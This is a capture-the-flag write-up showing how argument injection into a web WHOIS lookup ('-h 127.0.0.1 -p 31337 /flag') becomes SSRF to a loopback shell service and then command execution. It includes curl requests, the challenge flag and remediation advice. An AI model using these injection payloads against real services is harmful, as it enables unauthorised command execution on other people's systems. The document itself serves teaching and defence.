> Who is Whois?

## TL;DR

The `/whois` API passes our text through a WHOIS client without preventing us
from supplying command-line options. The GNU `whois` options `-h` and `-p` let
us replace the registry server with an arbitrary host and port. Pointing them
at `127.0.0.1:31337` reaches an internal service that executes each received
line with `/bin/sh`. Since the WHOIS lookup value becomes that line, using
`/flag` as the lookup object executes the flag binary and returns the flag in
the API response.

## 1. Mapping the Application

The landing page presents a normal WHOIS form. Its JavaScript shows the actual
API request:

```javascript
const response = await fetch('/whois', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({query: document.getElementById('query').value})
});
```

A standard lookup confirms the expected behavior:

```bash
curl -sS -X POST http://chal.thjcc.org:5000/whois \
  -H 'Content-Type: application/json' \
  --data '{"query":"example.com"}'
```

The response contains the output, exit status, execution time, and cache state:

```json
{
  "cached": false,
  "duration_ms": 574,
  "output": "Domain Name: EXAMPLE.COM ...",
  "returncode": 0,
  "status": "success"
}
```

The `/batch` page is useful additional reconnaissance. It confirms that the
backend runs an external WHOIS process, imposes a five-second process timeout,
and returns completed process output.

## 2. Discovering Argument Injection

The lookup input is not restricted to a domain. Supplying `--help` returns the
local WHOIS client's help text:

```bash
curl -sS -X POST http://chal.thjcc.org:5000/whois \
  -H 'Content-Type: application/json' \
  --data '{"query":"--help"}'
```

Relevant options in the result are:

```text
-h HOST, --host HOST   connect to server HOST
-p PORT, --port PORT   connect to PORT
```

This proves that user input is interpreted as multiple WHOIS arguments rather
than as one inert lookup value. We do not need shell metacharacters: the WHOIS
program itself provides an SSRF primitive.

## 3. Confirming Loopback SSRF

Redirect the WHOIS connection to the public application through its loopback
interface:

```text
-h 127.0.0.1 -p 5000 test
```

Instead of registry data, the API returns:

```text
HTTP/1.1 400 Bad Request
Invalid Request Line 'Invalid HTTP request line: 'test''
```

WHOIS sends its lookup object followed by a line terminator. Gunicorn receives
the word `test` as an invalid HTTP request line and sends its error page back.
The backend then relays that response to us. This establishes all parts of the
primitive:

1. We control the destination host with `-h`.
2. We control the destination port with `-p`.
3. We control the line sent to that service with the final WHOIS object.
4. The service response is returned in the `/whois` JSON output.

## 4. Finding the Internal Command Service

A small, targeted check of likely local service ports finds several deliberate
gateway services. Port `31337` is the important one:

```text
Query:  -h 127.0.0.1 -p 31337 probe
Output: sh: 1: probe: not found
```

The error is generated by a POSIX shell. Replacing `probe` with `id` confirms
that our WHOIS object is executed as a command:

```text
Query:  -h 127.0.0.1 -p 31337 id
Output: uid=100(redis) gid=101(redis) groups=101(redis)
```

At this point the exploit has progressed from argument injection, to SSRF, to
arbitrary command execution inside the internal Redis container.

## 5. Executing the Flag Program

Listing the filesystem reveals an executable `/flag`. The final query is:

```text
-h 127.0.0.1 -p 31337 /flag
```

The equivalent request from the command line is:

```bash
curl -sS -X POST http://chal.thjcc.org:5000/whois \
  -H 'Content-Type: application/json' \
  --data '{"query":"-h 127.0.0.1 -p 31337 /flag"}'
```

The internal service executes `/flag`, and the WHOIS client carries its output
back to the web API:

```json
{
  "output": "THJCC{Wh0_15_wH015???WH0_15_wh0_15:D}\n",
  "returncode": 0,
  "status": "success"
}
```

## Why It Works

The web application treats a user-controlled WHOIS query as a command-line
fragment. Although this does not immediately invoke a shell, allowing WHOIS
options is enough to redirect the outbound TCP connection. WHOIS is a
line-oriented protocol, so its lookup object becomes attacker-controlled input
to whichever internal service is selected.

That primitive becomes command execution because a shell-backed service is
listening on the loopback interface. Binding the service to localhost prevents
direct Internet access, but it does not protect it from a server-side request
primitive in the public application.

## Remediation

- Pass the lookup as exactly one subprocess argument and insert `--` before it,
  so values beginning with `-` cannot become WHOIS options.
- Validate lookups against the intended domain, IP, and ASN formats.
- Block loopback, link-local, private, and internal DNS destinations for every
  server-side network feature.
- Remove the shell gateway or replace it with a narrowly scoped service that
  never evaluates received data as commands.
- Apply network isolation between the public web application and internal
  management services; localhost is not a security boundary against SSRF.
